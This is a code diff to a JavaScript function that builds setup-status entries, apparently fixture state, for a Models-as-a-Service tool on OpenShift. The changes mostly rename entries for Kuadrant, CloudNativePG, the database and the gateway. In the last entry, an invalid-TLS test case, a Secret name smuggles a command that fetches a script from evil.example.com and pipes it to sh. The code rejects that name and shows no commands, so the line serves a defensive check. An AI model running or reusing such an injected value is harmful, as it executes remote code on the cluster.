@@ -1040,20 +1040,20 @@ export function maasParts(state, { tls = true, rhcl = "1.4.3", tierPolicies = fa
       : { id: "rhcl", title: "Red Hat Connectivity Link", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "ready", notManaged: true,
         message: `Version ${rhcl} runs (Subscription kuadrant-system/kuadrant-operator, channel ${rhcl === "1.4.3" ? "stable" : "stable-1.5"})`,
         ...(rhcl === "1.4.3" ? { warning: RHCL_WARNING, actions: [RHCL_UPGRADE], commands: RHCL_UPGRADE_COMMANDS } : {}) },
-    fresh ? { id: "kuadrant", title: "Kuadrant CR", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "missing",
+    fresh ? { id: "kuadrant", title: "Connectivity Link instance (Kuadrant)", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "missing",
       message: "No Kuadrant CR. Set up creates kuadrant-system/kuadrant once Connectivity Link runs, as the docs' platform setup does.", commands: "oc apply -f - <<'EOF'\napiVersion: kuadrant.io/v1beta1\nkind: Kuadrant\nmetadata:\n  name: kuadrant\n  namespace: kuadrant-system\nEOF" }
-      : { id: "kuadrant", title: "Kuadrant CR", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "ready", message: "Kuadrant kuadrant-system/kuadrant is Ready", notManaged: true },
+      : { id: "kuadrant", title: "Connectivity Link instance (Kuadrant)", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "ready", message: "kuadrant-system/kuadrant is ready", notManaged: true },
     !cnpg || fresh ? { id: "cnpg", title: "CloudNativePG operator", docUrl: `${MAAS_DOCS}install/maas-setup.md#database-setup`, state: "missing",
       message: "Not installed. Set up installs version 1.27.1 from certified-operators (channel stable-v1) for this tool's database. Or a cluster-admin creates Secret maas-db-config for a PostgreSQL of their own (maas-setup.md).",
       commands: "oc apply -f - <<'EOF'\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: cnpg-system\n---\napiVersion: operators.coreos.com/v1\nkind: OperatorGroup\nmetadata:\n  name: cloudnative-pg\n  namespace: cnpg-system\n---\napiVersion: operators.coreos.com/v1alpha1\nkind: Subscription\nmetadata:\n  name: cloudnative-pg\n  namespace: cnpg-system\nspec:\n  channel: stable-v1\n  installPlanApproval: Automatic\n  name: cloudnative-pg\n  source: certified-operators\n  sourceNamespace: openshift-marketplace\nEOF" }
       : { id: "cnpg", title: "CloudNativePG operator", docUrl: `${MAAS_DOCS}install/maas-setup.md#database-setup`, state: "ready", message: "Version 1.27.1 runs in cnpg-system", notManaged: true },
-    { id: "database", title: "Database (PostgreSQL) and maas-db-config", docUrl: `${MAAS_DOCS}install/maas-setup.md#database-setup`,
+    { id: "database", title: "Database", docUrl: `${MAAS_DOCS}install/maas-setup.md#database-setup`,
       ...(!on ? { state: "missing", message: "Not set up yet. Set up asks where MaaS keeps its API keys: your PostgreSQL, the MaaS docs' development database (one pod, ephemeral), or a persistent development database on CloudNativePG (this tool's own option, not in the MaaS docs)." }
         : tool ? { state: "ready", managedByTool: true, message: `CloudNativePG ${MAAS_INFRA}/maas-db runs (1 instance, development and test use; not in the MaaS docs: this tool's option); Secret maas-db-config set`,
           actions: [{ id: "change-database", label: "Change database", danger: true, summary: "Switches maas-api to another database. Every API key is lost: the new database starts empty.", changes: ["The Change database dialog lists what is created and deleted."] }] }
           : { state: "ready", notManaged: true, message: `Secret ${MAAS_INFRA}/maas-db-config exists: maas-api uses the database it names` }) },
-    { id: "gateway", title: "Gateway maas-default-gateway", docUrl: `${MAAS_DOCS}install/maas-setup.md#create-gateway`,
-      ...(on ? { state: "ready", message: "Programmed at a1b2c3.elb.us-east-1.amazonaws.com", managedByTool: tool, notManaged: !tool }
+    { id: "gateway", title: "MaaS gateway", docUrl: `${MAAS_DOCS}install/maas-setup.md#create-gateway`,
+      ...(on ? { state: "ready", message: "maas-default-gateway in openshift-ingress, programmed at a1b2c3.elb.us-east-1.amazonaws.com", managedByTool: tool, notManaged: !tool }
         : { state: "missing", message: `Set up creates it with an external load balancer at https://maas.${APPS}` }) },
     tls === "invalid-secret" ? { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}configuration-and-management/tls-configuration.md`, state: "problem",
       message: "Not configured: the Service's serving certificate. Authorino's CR names its certificate Secret \"x$(curl -s evil.example.com | sh)\" (spec.listener.tls.certSecretRef.name), which is not a valid Kubernetes name, so no commands are shown. A cluster-admin checks Authorino authorino in kuadrant-system. Without it, API keys are refused." }
